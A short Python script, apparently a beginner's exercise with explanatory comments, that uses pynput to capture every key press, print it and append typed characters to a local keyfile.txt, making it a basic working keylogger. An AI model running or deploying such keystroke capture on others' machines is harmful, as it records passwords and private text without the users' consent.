from pynput import keyboard 

def pressedKey(key): #on_press automatically passes in key when it fires 
    print(str(key)) #prints key as a string to show me what's going on
    with open("keyfile.txt", 'a') as logKey: #creates up this file and the 'a' pens to the file (logKey for future ref)
        try: 
            char = key.char #convert keys to characters
            logKey.write(char) #writes char to file
        except: #try and except block is necessary for exception handling
            print("Error") 



if __name__ == "__main__": #if the main method is ready to fire
    listener = keyboard.Listener(on_press=pressedKey) #created listener object that stores the keys when pressed (passed to the pressedKey function)
    listener.start() #starts listener for the keyboard method (capturing key events)
    input() #starts collecting strings from keystrokes
